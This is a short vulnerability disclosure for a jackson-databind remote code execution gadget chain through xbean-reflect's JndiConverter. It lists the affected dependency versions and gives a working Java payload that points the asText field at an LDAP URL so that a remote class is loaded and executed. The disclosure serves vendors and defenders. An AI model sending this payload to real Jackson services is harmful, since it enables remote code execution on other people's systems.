hello，my name is threedr3am.I found a jackson rce exploit chain.

一、New jackson-databind remote code execution exploit chain
1、The existence of xbean-reflect dependencies may lead to remote code execution

I found a new exploit chain，the class is "org.apache.xbean.propertyeditor.JndiConverter"，On a system using Jackson to parse Json, if there is an xbean-reflect dependency, it can remotely execute RCE using defaultType
二、Vulnerability self-assessment
Recommended rating: Serious

三、Vulnerability details
Principle: When org.apache.xbean.propertyeditor.JndiConverter is deserialized, by specifying the value corresponding to the json key of asText as the ldap service, the ldap service can refer to the malicious class, thereby triggering its setAsText method during deserialization. A chain that finally triggers InitialContext.lookup to the malicious class of the ldap service, thereby loading the remote class to local execution and achieving remote code execution RCE.

1、pom.xml

```
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.10.2</version>
</dependency>
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
    <version>4.15</version>
</dependency>
```

2、payload：

```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:43658/Calc\"}]";
mapper.readValue(json, Object.class);
```

3、result：

[IMAGE]
